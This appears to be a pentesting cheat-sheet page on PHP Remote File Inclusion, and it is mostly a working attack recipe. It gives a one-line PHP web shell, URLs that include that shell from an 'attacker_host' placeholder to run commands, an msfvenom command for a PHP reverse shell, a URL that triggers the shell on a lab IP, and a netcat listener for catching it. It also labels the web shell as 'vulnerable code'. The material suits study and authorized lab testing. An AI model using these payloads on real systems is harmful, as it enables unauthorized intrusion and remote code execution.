# Remote File Inclusion (RFI)

## Remote File Inclusion

Remote File Inclusion or RFI occurs when a website allows the inclusion of remotely hosted files. The impact of this vulnerability can be low or high, depending on the server's configuration.

In PHP the functions `allow_url_fopen` setting (enabled by default) and `allow_url_include` setting have to be turned on in the php configuration file.&#x20;

### Vulnerable Code

PHP vulnerable code:

```php
<?php system($_GET['cmd']); ?>
```

We can include a remote file from our server:

```
http://victim.vmx/index.php?param=ftp://user:pass@attacker_host/shell.php&cmd=id
http://victim.vmx/index.php?param=http://attacker_host/shell.php&cmd=id
```

### Finding RFI

Looking at the part `index.php?param=<Value>` we can test for RFI to see if vulnerable. I created a test.txt file on my attacking machine and then hosted the directory with a `Python SimpleHTTPServer`. Then browsed to the following:

```
http://192.168.230.53:8080/site/index.php?param=http://<YOUR_IP>/test.txt
```

As we know we are running PHP we can generate a PHP reverse shell with `msfvenom` in order to catch a reverse shell using the RFI.

```
msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f raw > phpreverseshell.php
```

Host this in the same directory as the `Python SimpleHTTPServer` and ensure the listening port is set to 21. Then in the browser browse to the shell we just generated.

```
http://192.168.230.53:8080/site/index.php?param=http://<YOUR_IP>/phpreverseshell.php
```

Receive a shell:

```
sudo nc -lvp 21
```
